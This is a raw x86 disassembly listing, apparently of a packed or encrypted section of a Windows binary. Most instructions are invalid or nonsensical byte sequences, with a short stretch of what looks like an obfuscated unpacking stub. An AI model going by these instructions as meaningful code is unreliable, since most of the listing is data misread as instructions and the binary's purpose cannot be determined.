  40ab57:	outs   dx,DWORD PTR ds:[esi]
  40ab58:	aam    0xaa
  40ab5a:	push   ss
  40ab5b:	dec    edx
  40ab5c:	jmp    0x454d:0xff97ae8d
  40ab63:	push   ds
  40ab64:	mov    ah,0x24
  40ab66:	xchg   esp,eax
  40ab67:	mov    eax,ds:0x71dc4418
  40ab6c:	outs   dx,BYTE PTR ds:[esi]
  40ab6d:	mov    ah,0x72
  40ab6f:	add    eax,0x320443d2
  40ab74:	dec    esp
  40ab75:	xchg   ecx,eax
  40ab76:	loopne 0x40ab3f
  40ab78:	jbe    0x40aba7
  40ab7a:	or     DWORD PTR [esi-0x7fa8ece6],edx
  40ab80:	inc    edi
  40ab81:	inc    edi
  40ab82:	loopne 0x40ab0a
  40ab84:	aas    
  40ab85:	jns    0x40ab22
  40ab87:	pop    cx
  40ab89:	test   al,0x1
  40ab8b:	lds    esi,FWORD PTR [eax]
  40ab8d:	push   ebx
  40ab8e:	mov    eax,ds:0x9f3023b3
  40ab93:	push   cs
  40ab94:	test   eax,0x4ad6ae18
  40ab99:	stos   DWORD PTR es:[edi],eax
  40ab9a:	jo     0x40ab91
  40ab9c:	sbb    al,0xd9
  40ab9e:	ja     0x40ab31
  40aba0:	push   es
  40aba1:	push   eax
  40aba2:	gs jl  0x40ab54
  40aba5:	adc    eax,0x286b3bd5
  40abaa:	call   0x7c0aba42
  40abaf:	ja     0x40abf6
  40abb1:	mov    dh,0x8f
  40abb3:	shr    DWORD PTR [edi],1
  40abb5:	fsub   QWORD PTR [esi-0x1c]
  40abb8:	or     ecx,esp
  40abba:	sub    al,0xf4
  40abbc:	push   esi
  40abbd:	ja     0x40ab89
  40abbf:	imul   ecx,DWORD PTR [edx-0xf],0x4168e60a
  40abc6:	mov    ds:0x8d6aea0,eax
  40abcb:	inc    eax
  40abcc:	(bad)  
  40abcd:	mov    dh,0x76
  40abcf:	mov    ecx,0xda9b7b63
  40abd4:	retf   
  40abd5:	int3   
  40abd6:	(bad)  
  40abd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abd8:	add    eax,0xaa093b1e
  40abdd:	mov    edx,cs
  40abdf:	cwde   
  40abe0:	pop    ss
  40abe1:	inc    esi
  40abe2:	popa   
  40abe3:	dec    eax
  40abe4:	call   0x5852fbe5
  40abe9:	jle    0x40abea
  40abeb:	jge    0x40ac5b
  40abed:	dec    eax
  40abee:	inc    esp
  40abef:	mov    ch,0x2f
  40abf1:	dec    edi
  40abf2:	iret   
  40abf3:	dec    ebp
  40abf4:	adc    al,0x5b
  40abf6:	and    eax,0x8ceea6b0
  40abfb:	or     edi,ebp
  40abfd:	ds push esp
  40abff:	mov    eax,0xfea58222
  40ac04:	mov    bh,0xeb
  40ac06:	or     al,0x33
  40ac08:	fsubr  QWORD PTR [ecx-0x246736fc]
  40ac0e:	sbb    eax,0xcb710ab6
  40ac13:	or     eax,0x93636b2b
  40ac18:	cs inc esp
  40ac1a:	jo     0x40ac92
  40ac1c:	ror    BYTE PTR [eax+0x16],cl
  40ac1f:	push   edi
  40ac20:	outs   dx,BYTE PTR ds:[esi]
  40ac21:	js     0x40abf6
  40ac23:	mov    ebx,0x4c4a5f3e
  40ac28:	in     eax,0x94
  40ac2a:	arpl   WORD PTR [esi+eiz*1],dx
  40ac2d:	stos   DWORD PTR es:[edi],eax
  40ac2e:	xor    BYTE PTR [eax+0x68336fca],0x31
  40ac35:	in     eax,0x8f
  40ac37:	mov    cl,0x39
  40ac39:	dec    eax
  40ac3a:	pop    ecx
  40ac3b:	out    dx,eax
  40ac3c:	(bad)  
  40ac3d:	js     0x40ac6e
  40ac3f:	stc    
  40ac40:	mov    al,0x87
  40ac42:	mov    edx,0x4fd6d27c
  40ac47:	ss dec edi
  40ac49:	inc    edx
  40ac4a:	mov    bh,BYTE PTR [ecx-0x1782b387]
  40ac50:	fabs   
  40ac52:	mov    dh,0x12
  40ac54:	sar    BYTE PTR [eax+0x7306840b],0xfc
  40ac5b:	imul   edi,DWORD PTR [esi+0x4c],0xc77f08db
  40ac62:	test   eax,0x323df7fd
  40ac67:	outs   dx,BYTE PTR ds:[esi]
  40ac68:	mov    bl,BYTE PTR [ebp-0x76eaa11b]
  40ac6e:	push   eax
  40ac6f:	pop    ds
  40ac70:	add    al,BYTE PTR [ecx+0x25]
  40ac73:	bound  ebp,QWORD PTR [esi-0x13]
  40ac76:	xlat   BYTE PTR ds:[ebx]
  40ac77:	out    0xf4,al
  40ac79:	test   al,0xd7
  40ac7b:	stos   DWORD PTR es:[edi],eax
  40ac7c:	out    0xe,al
  40ac7e:	sbb    cl,bl
  40ac80:	test   BYTE PTR [eax+0x6],0x7f
  40ac84:	retf   0x118
  40ac87:	ja     0x40acd0
  40ac89:	jge    0x40ac58
  40ac8b:	and    DWORD PTR [ecx-0x193b873f],eax
  40ac91:	call   0x51068008
  40ac96:	xchg   edx,eax
  40ac97:	jmp    0x40acdc
  40ac99:	cmp    ch,dh
  40ac9b:	sti    
  40ac9c:	ds jns 0x40ac5a
  40ac9f:	sbb    ecx,DWORD PTR [ebx+0x20]
  40aca2:	cld    
  40aca3:	ins    DWORD PTR es:[edi],dx
  40aca4:	leave  
  40aca5:	pop    esi
  40aca6:	icebp  
  40aca7:	jge    0x40acae
  40aca9:	loop   0x40acf8
  40acab:	push   ecx
  40acac:	mov    esp,0xcffef908
  40acb1:	and    DWORD PTR [edx-0x11],edx
  40acb4:	test   DWORD PTR [edi-0x1c5daa74],ebx
  40acba:	outs   dx,BYTE PTR ds:[esi]
  40acbb:	scas   al,BYTE PTR es:[edi]
  40acbc:	dec    eax
  40acbd:	add    al,0x23
  40acbf:	fxch   st(0)
  40acc1:	mov    DWORD PTR [ebx],ecx
  40acc3:	dec    edx
  40acc4:	pop    ss
  40acc5:	mov    dl,0x7e
  40acc7:	ror    DWORD PTR [eax+ebp*8-0x265cae68],0x50
  40accf:	sbb    DWORD PTR [edi-0x541815bf],ecx
  40acd5:	cmp    eax,0x2903a58b
  40acda:	jns    0x40aca0
  40acdc:	imul   ebx,DWORD PTR fs:[edi+0x1f1f3a45],0x27ca66ef
  40ace7:	mov    eax,0xf043af38
  40acec:	push   esi
  40aced:	(bad)  
  40acee:	out    0x9d,eax
  40acf0:	pop    edi
  40acf1:	mov    ah,0x5d
  40acf3:	mov    dh,BYTE PTR [edx-0x417d1709]
  40acf9:	jno    0x40acf4
  40acfb:	js     0x40acca
  40acfd:	jmp    0xa04c0198
  40ad02:	enter  0x2819,0x4e
  40ad06:	pop    edi
  40ad07:	lods   al,BYTE PTR ds:[esi]
  40ad08:	sahf   
  40ad09:	fdivr  QWORD PTR [esp+ebx*2]
  40ad0c:	test   bl,bh
  40ad0e:	(bad)  
  40ad0f:	adc    al,0x39
  40ad11:	(bad)  [ebp-0x5b]
  40ad14:	jno    0x40acb3
  40ad16:	xchg   esp,eax
  40ad17:	or     eax,0x20ac8f65
  40ad1c:	xor    esi,DWORD PTR [eax]
  40ad1e:	and    edx,DWORD PTR [ebp-0x52]
  40ad21:	dec    esp
  40ad22:	inc    esi
  40ad23:	popf   
  40ad24:	retf   
  40ad25:	mul    BYTE PTR [ebp+0x5e8f6a02]
  40ad2b:	imul   al
  40ad2d:	jge    0x40ad2d
  40ad2f:	push   si
  40ad31:	shl    DWORD PTR [ecx+0x5f],0x52
  40ad35:	or     DWORD PTR [eax-0x687dbbfb],esi
  40ad3b:	(bad)  
  40ad3c:	jbe    0x40adac
  40ad3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad3f:	inc    edi
  40ad40:	out    0x5d,al
  40ad42:	lods   al,BYTE PTR ds:[esi]
  40ad43:	mov    esp,DWORD PTR ds:0xb1b0d5ca
  40ad49:	xchg   ebp,eax
  40ad4a:	xor    BYTE PTR [ecx-0x1f],bl
  40ad4d:	adc    BYTE PTR [ebx],al
  40ad4f:	out    0x40,al
  40ad51:	push   cs
  40ad52:	mov    bl,0x20
  40ad54:	inc    edx
  40ad55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad56:	scas   eax,DWORD PTR es:[edi]
  40ad57:	xor    BYTE PTR [edx-0x7f],dl
  40ad5a:	lea    edx,[ebx+0x23ea9cd9]
  40ad60:	loopne 0x40ad3d
  40ad62:	sbb    DWORD PTR [eax-0x29],edi
  40ad65:	mov    ch,0x44
  40ad67:	bound  edi,QWORD PTR [esp+eax*1]
  40ad6a:	xor    ch,BYTE PTR [edx+eax*8]
  40ad6d:	lahf   
  40ad6e:	(bad)  
  40ad6f:	ss int3 
  40ad71:	pop    eax
  40ad72:	out    0xf8,eax
  40ad74:	into   
  40ad75:	jecxz  0x40ad0d
  40ad77:	icebp  
  40ad78:	or     DWORD PTR ss:[eax],ecx
  40ad7b:	pop    ebp
  40ad7c:	sbb    ch,BYTE PTR [edi]
  40ad7e:	or     ecx,DWORD PTR [ebx]
  40ad80:	mov    eax,ebp
  40ad82:	inc    esp
  40ad83:	lahf   
  40ad84:	jle    0x40adc4
  40ad86:	(bad)  
  40ad87:	test   eax,0xeb52aa9e
  40ad8c:	sub    eax,0x4f
  40ad8f:	sbb    al,0xd0
  40ad91:	jb     0x40ad7c
  40ad93:	pop    eax
  40ad94:	mov    edx,0xc52cb925
  40ad99:	hlt    
  40ad9a:	push   edi
  40ad9b:	cmp    al,0xca
  40ad9d:	imul   ebp,DWORD PTR [edx+0x605418ff],0xffffffa5
  40ada4:	out    0xc6,eax
  40ada6:	hlt    
  40ada7:	test   DWORD PTR [ebx],ecx
  40ada9:	pop    edx
  40adaa:	xlat   BYTE PTR ds:[ebx]
  40adab:	push   ss
  40adac:	data16 (bad) 
  40adae:	jmp    0x40ae25
  40adb0:	sbb    ch,BYTE PTR ds:0xbe59e208
  40adb6:	loope  0x40ad8b
  40adb8:	pop    ebx
  40adb9:	mov    esp,0x32cf8c6c
  40adbe:	daa    
  40adbf:	lods   al,BYTE PTR ds:[esi]
  40adc0:	pop    esp
  40adc1:	mov    BYTE PTR gs:[edx-0x4],cl
  40adc5:	and    eax,0xa4a6ca0f
  40adca:	or     eax,0xc7052a67
  40adcf:	jmp    0x40ad87
  40add1:	xor    DWORD PTR [edi+0x75324396],esi
  40add7:	xchg   edi,eax
  40add8:	adc    DWORD PTR [edi-0x60b2a6ad],edi
  40adde:	inc    ecx
  40addf:	xchg   edi,eax
  40ade0:	or     bh,BYTE PTR [edi]
  40ade2:	xchg   edx,eax
  40ade3:	jbe    0x40ade1
  40ade5:	cld    
  40ade6:	mov    eax,0x513ca65d
  40adeb:	retf   0x2de0
  40adee:	jge    0x40adac
  40adf0:	sub    BYTE PTR [ebp+0x4e],ch
  40adf3:	xchg   esi,eax
  40adf4:	push   esp
  40adf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adf6:	push   ebx
  40adf7:	cmp    dh,BYTE PTR [ebx-0x17efc1a3]
  40adfd:	mov    ah,0x79
  40adff:	stc    
  40ae00:	ror    BYTE PTR [edx+0x3b0ea31e],0x2c
  40ae07:	xor    BYTE PTR [esi],0x93
  40ae0a:	(bad)  
  40ae0b:	jnp    0x40addc
  40ae0d:	loope  0x40adba
  40ae0f:	jg     0x40ae39
  40ae11:	ins    DWORD PTR es:[edi],dx
  40ae12:	rcl    al,cl
  40ae14:	dec    esp
  40ae15:	sub    DWORD PTR [ecx+0x77a70362],edx
  40ae1b:	push   es
  40ae1c:	and    esp,DWORD PTR [eax+eax*4]
  40ae1f:	(bad)  
  40ae20:	mov    eax,DWORD PTR [esi-0x7cd5955f]
  40ae26:	xchg   ebx,eax
  40ae27:	mov    dh,0x35
  40ae29:	icebp  
  40ae2a:	fucomip st,st(3)
  40ae2c:	push   0x17
  40ae2e:	sbb    edi,DWORD PTR [ebx]
  40ae30:	pop    ds
  40ae31:	mov    BYTE PTR [ecx+0xc95ecce],dl
  40ae37:	(bad)  
  40ae39:	ins    BYTE PTR es:[edi],dx
  40ae3a:	push   ecx
  40ae3b:	aas    
  40ae3c:	loop   0x40ae60
  40ae3e:	mov    al,ds:0x266d1dbb
  40ae43:	add    al,0x92
  40ae46:	out    0x1b,eax
  40ae48:	sbb    bh,al
  40ae4a:	inc    ebp
  40ae4b:	loopne 0x40ae10
  40ae4d:	outs   dx,BYTE PTR ds:[esi]
  40ae4e:	add    BYTE PTR [eax],al
  40ae50:	xor    ecx,0x7405
  40ae56:	push   esi
  40ae57:	mov    DWORD PTR [ebp-0x1c],0x2a74
  40ae5e:	mov    DWORD PTR [ebp-0x10],0x2e2c
  40ae65:	push   0x5285
  40ae6a:	xor    ecx,0x324d
  40ae70:	mov    DWORD PTR [ebp-0xc],0x3d0a
  40ae77:	sbb    eax,ecx
  40ae79:	mov    eax,DWORD PTR [ebp-0x10]
  40ae7c:	cmp    DWORD PTR ds:0x4282cb,0x0
  40ae83:	mov    ecx,DWORD PTR ds:0x428293
  40ae89:	mov    ecx,0x7ccc
  40ae8e:	jmp    0x40af01
  40ae93:	mov    DWORD PTR ds:0x4283c7,edx
  40ae99:	movzx  ecx,BYTE PTR ds:0x4282ab
  40aea0:	cmp    DWORD PTR ds:0x4282cb,0x0
  40aea7:	ja     0x40aee7
  40aead:	push   0x309a
  40aeb2:	push   DWORD PTR [ebp-0x1c]
  40aeb5:	push   DWORD PTR [ebp-0x14]
  40aeb8:	push   0x4280fb
  40aebd:	call   DWORD PTR ds:0x428eb8
  40aec3:	mov    ecx,DWORD PTR ds:0x42834b
  40aec9:	xor    DWORD PTR ds:0x42826f,ecx
  40aecf:	or     DWORD PTR ds:0x4283bb,ecx
  40aed5:	or     DWORD PTR ds:0x4282d3,ecx
  40aedb:	mov    ecx,DWORD PTR ds:0x4282df
  40aee1:	adc    DWORD PTR ds:0x4282a7,ecx
  40aee7:	xor    ecx,ecx
  40aee9:	or     ecx,DWORD PTR ds:0x4281a3
  40aeef:	adc    ecx,DWORD PTR ds:0x4283c7
  40aef5:	mov    DWORD PTR ds:0x4281a3,ecx
  40aefb:	and    ecx,0x2e4b
  40af01:	mov    ecx,DWORD PTR [ebp-0xc]
  40af04:	push   0x712c
  40af09:	adc    DWORD PTR ds:0x4283c3,0x428337
  40af13:	push   ecx
  40af14:	and    DWORD PTR ds:0x4281a3,0x72a4
  40af1e:	jmp    0x40b314
  40af23:	xchg   ecx,eax
  40af24:	sahf   
  40af25:	push   0x5e4f260e
  40af2a:	push   ds
  40af2b:	(bad)  
  40af2c:	fist   WORD PTR [edi-0x56]
  40af2f:	xchg   DWORD PTR [eax+0x61],esi
  40af32:	jo     0x40aee9
  40af34:	sbb    ebx,DWORD PTR [eax]
  40af36:	sbb    BYTE PTR [esi+0x12],ch
  40af39:	sbb    BYTE PTR [eax],bl
  40af3b:	pop    es
  40af3c:	jp     0x40af6d
  40af3e:	fisttp QWORD PTR cs:[ecx]
  40af41:	push   edi
  40af42:	in     al,dx
  40af43:	jns    0x40aee0
  40af45:	jg     0x40aed3
  40af47:	dec    edi
  40af48:	aam    0x7e
  40af4a:	ds (bad) 
  40af4c:	adc    ebx,ebx
  40af4e:	jnp    0x40afb5
  40af50:	xchg   edx,eax
  40af51:	mov    eax,ds:0x58225a52
  40af56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af57:	test   dh,dl
  40af59:	xor    ecx,edx
  40af5b:	rol    esi,1
  40af5d:	sbb    ebx,DWORD PTR [edi]
  40af5f:	sub    dh,BYTE PTR [ecx+eiz*1-0x7c5cc241]
  40af66:	sar    BYTE PTR [esi-0x2b],1
  40af69:	(bad)  
  40af6a:	push   esp
  40af6b:	cwde   
  40af6c:	lods   eax,DWORD PTR ds:[esi]
  40af6d:	add    al,0x23
  40af6f:	inc    esi
  40af70:	retw   0xb391
  40af74:	pop    eax
  40af75:	pop    ds
  40af76:	add    BYTE PTR [ebx-0x25],al
  40af79:	jl     0x40af5e
  40af7b:	pop    edx
  40af7c:	xchg   esp,eax
  40af7d:	lea    esp,[ebp-0x66]
  40af80:	sub    eax,0xecf53b8
  40af85:	daa    
  40af86:	adc    al,0x4a
  40af88:	cmp    BYTE PTR ds:0xb7edc139,bl
  40af8e:	xlat   BYTE PTR ds:[ebx]
  40af8f:	xor    DWORD PTR [ecx],esi
  40af91:	iret   
  40af92:	xchg   edi,eax
  40af93:	xlat   BYTE PTR ds:[ebx]
  40af94:	sbb    cl,BYTE PTR [edx+0x31]
  40af97:	cmp    ebx,DWORD PTR [eax]
  40af99:	push   ecx
  40af9a:	pop    ss
  40af9b:	repnz mov dh,0x2
  40af9e:	inc    ebp
  40af9f:	outs   dx,BYTE PTR ds:[esi]
  40afa0:	cs jb  0x40b009
  40afa3:	rol    DWORD PTR ds:0x57012fe,0x63
  40afaa:	jl     0x40af3c
  40afac:	jae    0x40b015
  40afae:	mov    dh,0x44
  40afb0:	sbb    BYTE PTR [eax+edi*4+0x35],0xa1
  40afb5:	out    dx,al
  40afb6:	xchg   ecx,eax
  40afb7:	pop    ebp
  40afb8:	cmp    ebx,DWORD PTR [ecx+ecx*4-0x8]
  40afbc:	mov    ebp,0x3b2e09ef
  40afc1:	xchg   edi,eax
  40afc2:	ss push ebp
  40afc4:	cmp    ah,BYTE PTR [ecx]
  40afc6:	cwde   
  40afc7:	repnz xchg ecx,eax
  40afc9:	mov    bl,0xbc
  40afcb:	(bad)  
  40afcc:	pop    ebp
  40afcd:	cmp    al,0x95
  40afcf:	push   es
  40afd0:	ins    BYTE PTR es:[edi],dx
  40afd1:	sub    eax,0x7e769a4f
  40afd6:	xchg   edx,eax
  40afd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afd8:	adc    dl,BYTE PTR [eax+eiz*4]
  40afdb:	fnstenv [ebp+0x3a11e300]
  40afe1:	punpcklbw mm7,DWORD PTR [ebp+0x10]
  40afe5:	je     0x40b015
  40afe7:	out    0xe9,eax
  40afe9:	push   ds
  40afea:	cmp    eax,0x33
  40afed:	xlat   BYTE PTR ds:[ebx]
  40afee:	mov    bl,0x76
  40aff0:	mov    ch,0x48
  40aff2:	push   ecx
  40aff3:	outs   dx,DWORD PTR ds:[esi]
  40aff4:	sbb    ebx,DWORD PTR [ebx]
  40aff6:	out    0x4e,al
  40aff8:	cmp    edi,0x90fe6dad
  40affe:	nop
  40afff:	xchg   edx,eax
  40b000:	pop    esi
  40b001:	hlt    
  40b002:	and    eax,0x19ad328
  40b007:	sub    al,0x0
  40b009:	dec    eax
  40b00a:	mov    dh,0x41
  40b00c:	popf   
  40b00d:	xchg   edx,eax
  40b00e:	neg    bh
  40b010:	dec    edi
  40b011:	daa    
  40b012:	xchg   esp,eax
  40b013:	cmp    bl,BYTE PTR [edi]
  40b015:	int3   
  40b016:	stos   DWORD PTR es:[edi],eax
  40b017:	add    ah,BYTE PTR [esi]
  40b019:	adc    dl,BYTE PTR [eax+0x7e752498]
  40b01f:	pop    DWORD PTR [edx+ebx*8-0x6b5c0fd1]
  40b026:	and    dl,BYTE PTR [ebx]
  40b028:	push   ebp
  40b029:	call   0x182fc60
  40b02e:	jle    0x40b028
  40b030:	sbb    al,0x63
  40b032:	add    dl,0x6
  40b035:	sub    al,0xc9
  40b037:	sub    esi,ebx
  40b039:	push   0x920ecee8
  40b03e:	inc    esi
  40b03f:	cmp    BYTE PTR ds:0x21c2e678,ch
  40b045:	mov    edi,0xeccf89a6
  40b04a:	(bad)  es:[eax-0x164144a5]
  40b051:	loopne 0x40b06c
  40b053:	ds mov cl,0x4
  40b056:	mov    al,ds:0x2326bb20
  40b05b:	fcomp  DWORD PTR [esi+0x67fa86d4]
  40b061:	int3   
  40b062:	test   BYTE PTR [ebp-0xa5b8b75],0x91
  40b069:	sub    ebx,esp
  40b06b:	xchg   ebp,eax
  40b06c:	in     al,0xd6
  40b06e:	mov    esp,DWORD PTR [ebp-0x6f]
  40b071:	cmp    al,0xc3
  40b073:	dec    esi
  40b074:	jmp    0xfa0935da
  40b079:	(bad)  [eax]
  40b07b:	adc    BYTE PTR [edi+0x48],dh
  40b07e:	fwait
  40b07f:	add    ch,BYTE PTR [edx]
  40b081:	jno    0x40b101
  40b083:	mov    eax,0xe4918eaf
  40b088:	inc    ebp
  40b089:	mov    cl,0xd3
  40b08b:	outs   dx,DWORD PTR ds:[esi]
  40b08c:	addr16 pop ss
  40b08e:	xchg   DWORD PTR ds:0x458bb8d6,edi
  40b094:	scas   eax,DWORD PTR es:[edi]
  40b095:	ror    DWORD PTR [ebx],0x27
  40b098:	xchg   al,bh
  40b09a:	test   al,0x94
  40b09c:	mov    WORD PTR [ebx+0x49d3cdbd],cs
  40b0a2:	cmp    esi,ebp
  40b0a4:	adc    eax,DWORD PTR [ebp+0x13a17094]
  40b0aa:	jp     0x40b097
  40b0ac:	mov    ebx,0x73134e3f
  40b0b1:	fidivr DWORD PTR [edi+edx*4]
  40b0b4:	pop    esp
  40b0b5:	rcl    dl,1
  40b0b7:	or     ah,BYTE PTR [ecx-0xcf3a3b3]
  40b0bd:	daa    
  40b0be:	test   DWORD PTR [ebx-0x3dcc5276],esi
  40b0c4:	in     eax,0xdd
  40b0c6:	outs   dx,DWORD PTR ds:[esi]
  40b0c7:	cmp    eax,0x73fd8ca3
  40b0cc:	jnp    0x40b132
  40b0ce:	out    0xc6,eax
  40b0d0:	fmul   DWORD PTR [ebp-0x25]
  40b0d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0d4:	mov    ds:0xee4e6de0,eax
  40b0d9:	std    
  40b0da:	ins    BYTE PTR es:[edi],dx
  40b0db:	cs pop es
  40b0dd:	dec    esi
  40b0de:	and    dh,cl
  40b0e0:	out    dx,eax
  40b0e1:	adc    BYTE PTR [ebx+0x2a],al
  40b0e4:	jg     0x40b102
  40b0e6:	sub    ebx,DWORD PTR [ecx+0x2f]
  40b0e9:	jl     0x40b143
  40b0eb:	dec    esi
  40b0ec:	xor    esi,ecx
  40b0ee:	loop   0x40b14e
  40b0f0:	mov    bl,BYTE PTR [ebp-0x66ba320c]
  40b0f6:	jae    0x40b15c
  40b0f8:	sbb    eax,0x3eac3970
  40b0fd:	sar    DWORD PTR [ebp+0x2e],0x7e
  40b101:	jp     0x40b11b
  40b103:	and    bh,bh
  40b105:	fisttp QWORD PTR [esp+eax*1+0x78eedb99]
  40b10c:	xchg   ebx,eax
  40b10d:	mov    dh,0x2c
  40b10f:	and    al,ah
  40b111:	inc    ebp
  40b112:	mov    ebp,0x46bf92a0
  40b117:	cld    
  40b118:	cmp    DWORD PTR [edx+0x461c7aca],ecx
  40b11e:	icebp  
  40b11f:	bound  esi,QWORD PTR [eax]
  40b121:	ficom  WORD PTR [esi+0x4f0019b8]
  40b127:	mov    al,ds:0x40d3acff
  40b12c:	jno    0x40b193
  40b12e:	ds arpl sp,bp
  40b131:	mov    bl,0x3c
  40b133:	mov    ds:0xe6fa5802,al
  40b138:	sub    BYTE PTR [eax-0x22],ah
  40b13b:	sub    esi,edx
  40b13d:	mov    esp,0xf3580069
  40b142:	out    0x4e,al
  40b144:	inc    esp
  40b145:	dec    edx
  40b146:	les    edi,FWORD PTR [eax]
  40b148:	cmp    BYTE PTR [ecx-0x3ff2db5e],0x4
  40b14f:	outs   dx,BYTE PTR ds:[esi]
  40b150:	jae    0x40b11d
  40b152:	cmp    BYTE PTR [ebx],0xde
  40b155:	scas   eax,DWORD PTR es:[edi]
  40b156:	into   
  40b157:	js     0x40b1a2
  40b159:	aam    0x30
  40b15b:	jl     0x40b12c
  40b15d:	mov    cl,0xc1
  40b15f:	scas   eax,DWORD PTR es:[edi]
  40b160:	jns    0x40b0f2
  40b162:	jmp    0x7d83:0x83f427dd
  40b169:	adc    ecx,DWORD PTR ds:0x4c758a93
  40b16f:	cdq    
  40b170:	call   0xe0bb:0x3908c2dc
  40b177:	mov    esp,0xaa1cd94f
  40b17c:	cli    
  40b17d:	into   
  40b17e:	je     0x40b153
  40b180:	sub    al,0xa8
  40b182:	call   0x4a21:0xc209851a
  40b189:	sub    edx,ecx
  40b18b:	mov    ecx,0x8f02c2a0
  40b190:	stc    
  40b191:	int    0x93
  40b193:	mov    edi,DWORD PTR [edi]
  40b195:	push   edi
  40b196:	icebp  
  40b197:	enter  0xeaa3,0x71
  40b19b:	push   eax
  40b19c:	jno    0x40b1cf
  40b19e:	xlat   BYTE PTR ds:[ebx]
  40b19f:	push   edi
  40b1a0:	imul   DWORD PTR [edi]
  40b1a2:	inc    eax
  40b1a3:	xchg   edi,eax
  40b1a4:	mov    eax,ds:0x98c11f59
  40b1a9:	int3   
  40b1aa:	into   
  40b1ab:	xor    al,0x4e
  40b1ad:	jge    0x40b1cd
  40b1af:	add    BYTE PTR [esp+edx*8],cl
  40b1b2:	pop    ss
  40b1b3:	cmc    
  40b1b4:	sar    edi,cl
  40b1b6:	(bad)
  40b1ba:	adc    ebx,DWORD PTR [edi+eax*8]
  40b1bd:	js     0x40b1ad
  40b1bf:	shl    BYTE PTR [edx+0x53],0x50
  40b1c3:	mov    bh,0xda
  40b1c5:	jmp    0x40b1a6
  40b1c7:	jg     0x40b15f
  40b1c9:	inc    esp
  40b1ca:	mov    al,0x6d
  40b1cc:	icebp  
  40b1cd:	or     al,0x68
  40b1cf:	push   ecx
  40b1d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1d1:	mov    esp,0x63c4acbe
  40b1d6:	lahf   
  40b1d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1d8:	ins    BYTE PTR es:[edi],dx
  40b1d9:	mov    ch,0xbc
  40b1db:	rcr    DWORD PTR [ebx],cl
  40b1dd:	repz pusha 
  40b1df:	xchg   esi,eax
  40b1e0:	jmp    0xdd6fdf90
  40b1e5:	push   es
  40b1e6:	rcr    edi,1
  40b1e8:	sub    eax,DWORD PTR [ecx]
  40b1ea:	ret    
  40b1eb:	mov    dl,0x6f
  40b1ed:	pushf  
  40b1ee:	sbb    BYTE PTR [ebp+edx*8-0x705db10f],bl
  40b1f5:	inc    ebx
  40b1f6:	dec    edi
  40b1f7:	clc    
  40b1f8:	retf   0x56d4
  40b1fb:	jmp    0x1364dbfa
  40b200:	xor    DWORD PTR [ecx+esi*2-0x8],edx
  40b204:	mov    edx,0xbdd1db54
  40b209:	rcl    BYTE PTR [edi],1
  40b20b:	out    dx,al
  40b20c:	les    ebx,FWORD PTR [ebp+0x55]
  40b20f:	push   eax
  40b210:	and    bl,BYTE PTR [edx-0x27ef4ce3]
  40b216:	test   eax,0x8836ce08
  40b21b:	jo     0x40b26e
  40b21d:	or     ch,al
  40b21f:	fld    TBYTE PTR [ebx-0x565868ba]
  40b225:	(bad)  
  40b226:	fiadd  DWORD PTR [edi+0x3e]
  40b229:	cld    
  40b22a:	or     eax,0x9185f7ba
  40b22f:	mov    eax,ds:0x4db3db4f
  40b234:	dec    ecx
  40b235:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b236:	adc    BYTE PTR [edx],cl
  40b238:	sbb    BYTE PTR [ebp+0x36],dh
  40b23b:	adc    BYTE PTR [edi],bl
  40b23d:	mov    BYTE PTR ds:0xc6602d7b,bh
  40b243:	xchg   edx,eax
  40b244:	inc    ecx
  40b245:	mov    DWORD PTR [ecx+0x38],esi
  40b248:	cmp    BYTE PTR [esi],cl
  40b24a:	jg     0x40b222
  40b24c:	lock cmp al,0x54
  40b24f:	test   BYTE PTR [eax],ah
  40b251:	mov    al,ds:0xf3f0dc8
  40b256:	mov    esi,0xb18fe196
  40b25b:	or     ebp,esp
  40b25d:	push   eax
  40b25e:	or     edi,DWORD PTR [edx+esi*4]
  40b261:	stos   DWORD PTR es:[edi],eax
  40b262:	ret    
  40b263:	inc    ebx
  40b264:	jno    0x40b245
  40b266:	push   es
  40b267:	push   ebp
  40b268:	pop    ds
  40b269:	and    ebx,eax
  40b26b:	rol    DWORD PTR [ebx],cl
  40b26d:	and    al,0x71
  40b26f:	push   esi
  40b270:	mov    dh,0x1c
  40b272:	jmp    0xd3582895
  40b277:	shr    dh,1
  40b279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b27a:	sub    al,0xb4
  40b27c:	mov    esp,0x97206456
  40b281:	hlt    
  40b282:	fdivr  QWORD PTR [edi+ecx*4+0x18]
  40b286:	les    esi,FWORD PTR [esi-0x63885f6a]
  40b28c:	pop    esp
  40b28d:	aaa    
  40b28e:	les    ebx,FWORD PTR [eax-0x3b]
  40b291:	inc    esp
  40b292:	xchg   ecx,eax
  40b293:	(bad)  
  40b294:	pop    es
  40b295:	push   ebx
  40b296:	mov    esp,0xee27878a
  40b29b:	out    0xa7,al
  40b29d:	inc    ebp
  40b29e:	(bad)  
  40b29f:	mov    ds:0xaec3fd46,al
  40b2a4:	add    bh,al
  40b2a6:	add    dh,BYTE PTR [ebx+0x70]
  40b2a9:	add    edi,DWORD PTR [edi+0x2d0c1123]
  40b2af:	adc    eax,DWORD PTR [eiz*1-0x3b32124b]
  40b2b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2b7:	(bad)  
  40b2b8:	fdivr  DWORD PTR [eax+0x74]
  40b2bb:	icebp  
  40b2bc:	jb     0x40b2b5
  40b2be:	ja     0x40b327
  40b2c0:	sub    ebx,DWORD PTR [ebp-0x61902fbc]
  40b2c6:	scas   eax,DWORD PTR es:[edi]
  40b2c7:	das    
  40b2c8:	mov    ds:0xa0f6a7d8,al
  40b2ce:	jnp    0x40b347
  40b2d0:	out    0x1b,eax
  40b2d2:	enter  0x9cec,0x9d
  40b2d6:	and    eax,eax
  40b2d8:	pop    ss
  40b2d9:	sub    BYTE PTR [ebx+0x7d],bh
  40b2dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
